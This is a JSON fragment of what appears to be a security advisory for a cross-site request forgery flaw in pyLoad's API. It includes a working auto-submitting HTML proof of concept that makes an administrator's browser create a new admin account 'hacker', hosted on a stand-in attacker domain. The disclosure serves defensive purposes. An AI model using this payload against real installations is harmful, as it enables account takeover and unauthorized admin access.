  "summary": "Cross-Site Request Forgery on any API call in pyLoad may lead to admin privilege escalation",
  "details": "### Summary\nThe `pyload` API allows any API call to be made using GET requests. Since the session cookie is not set to `SameSite: strict`, this opens the library up to severe attack possibilities via a Cross-Site Request Forgery (CSRF) attack. This proof of concept shows how an unauthenticated user could trick the administrator's browser into creating a new admin user.\n\n### PoC\nWe host the following HTML file on an attacker-controlled server.\n```html\n\u003chtml\u003e\n  \u003c!-- CSRF PoC - generated by Burp Suite Professional --\u003e\n  \u003cbody\u003e\n    \u003cform action=\"http://localhost:8000/api/add_user/%22hacker%22,%22hacker%22\"\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n    \u003cscript\u003e\n      history.pushState('', '', '/');\n      document.forms[0].submit();\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nIf we now trick an administrator into visiting our malicious page at `https://attacker.com/CSRF.html`, we see that their browser will make a request to `/api/add_user/%22hacker%22,%22hacker%22`, adding a new administrator to the `pyload` application.\n![image](https://user-images.githubusercontent.com/44903767/294942232-d874e838-f8eb-492f-98df-2d16ba74ff25.png)\n\nThe attacker can now authenticate as this newly created administrator user with the username `hacker` and password `hacker`.\n![image](https://user-images.githubusercontent.com/44903767/294942635-c6d9adca-0f3a-4d99-92ac-6d3bf8e9ee01.png)\n\n### Impact\nAny API call can be made via a CSRF attack by an unauthenticated user.\n",
